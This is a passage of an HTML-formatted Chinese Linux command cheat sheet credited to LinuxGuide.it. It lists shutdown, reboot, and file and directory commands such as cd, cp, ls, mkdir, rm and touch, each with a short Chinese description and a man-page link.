</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    取消按预定时间关闭系统 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=shutdown)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # shutdown -r now
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    重启[(1) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=shutdown)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # telinit 0
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    关闭系统[(3) [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=telinit)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark43">文件和目录</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    说明
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cd /home
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    进入<span class="s52">&#39;/ home&#39; </span>目录[&#39; [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cd)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cd ..
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    返回上一级目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cd)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cd ../..
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    返回上两级目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cd)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cd
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    进入个人的主目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cd)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cd ~user1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    进入个人的主目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cd)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cd -
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    返回上次所在的目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cd)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cp file1 file2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    复制一个文件 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cp)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:36pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cp dir/* .
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    复制一个目录下的所有文件到当前工作目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cp)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cp -a /tmp/dir1 .
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    复制一个目录到当前工作目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cp)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cp -a dir1 dir2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    复制一个目录 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=cp)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # cp file file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    将<span class="s52">file</span>复制为[file1 [](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=file)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iconv -l
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    列出已知的编码 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=iconv)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    改变字符的编码 [[](http://www.linuxguide.it/command_line/linux-manpage/do.php?file=iconv)<span class="s55">man</span><span class="s52">]</span>
</td></tr><tr style="height:34pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # find . -maxdepth 1 -name *.jpg -print - exec convert
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    [没有使用该语言的解释](http://www.linuxguide.it/command_line/cn/linux_commands_line.php?MenuShow=UsersArea&amp;AdminOperation)<span style=" color: #00F; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>[Chinese?]
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ln -s file1 lnk1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个指向文件或目录的软链接
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ln file1 lnk1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个指向文件或目录的物理链接
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看目录中的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls -F
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    查看目录中的文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls -l
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示文件和目录的详细资料
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls -a
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示隐藏文件
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # ls *[0-9]*
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示包含数字的文件名和目录名
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # lstree
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示文件和目录由根目录开始的树形结构

(2)
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkdir dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个叫做<span class="s52">&#39;dir1&#39; </span>的目录<span class="s52">&#39;</span>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkdir dir1 dir2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    同时创建两个目录
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mkdir -p /tmp/dir1/dir2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    创建一个目录树
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # mv dir1 new_dir
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    重命名<span class="s52">/</span>移动一个目录
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # pwd
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示工作路径
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # rm -f file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除一个叫做<span class="s52">&#39;file1&#39; </span>的文件<span class="s52">&#39;</span>
</td></tr></table><table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # rm -rf dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除一个叫做<span class="s52">&#39;dir1&#39; </span>的目录并同时删除其内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # rm -rf dir1 dir2
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    同时删除两个目录及它们的内容
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # rmdir dir1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    删除一个叫做<span class="s52">&#39;dir1&#39; </span>的目录<span class="s52">&#39;</span>
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#F0F0F0">

    # touch -t 0712250000 file1
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    修改一个文件或目录的时间戳<span class="s52">- (YYMMDDhhmm)</span>
</td></tr><tr style="height:35pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    # tree
</td><td style="width:211pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#A1A1A1;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    显示文件和目录由根目录开始的树形结构

(1)
</td></tr><tr style="height:18pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    [Linux Command Line written by ](http://www.linuxguide.it/commands)[LinuxGuide.it](http://www.linuxguide.it/commands)<span style=" color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt;"> </span>(<span class="s55">Credits</span>)
</td></tr></table>

    <table style="border-collapse:collapse;margin-left:10.885pt" cellspacing="0"><tr style="height:21pt"><td style="width:405pt;border-top-style:solid;border-top-width:1pt;border-top-color:#A1A1A1;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1" colspan="2">

    <a name="bookmark44">文件搜索</a>
</td></tr><tr style="height:19pt"><td style="width:194pt;border-top-style:solid;border-top-width:1pt;border-top-color:#505050;border-left-style:solid;border-left-width:1pt;border-left-color:#F0F0F0;border-bottom-style:solid;border-bottom-width:1pt;border-bottom-color:#A1A1A1;border-right-style:solid;border-right-width:1pt;border-right-color:#A1A1A1">

    命令
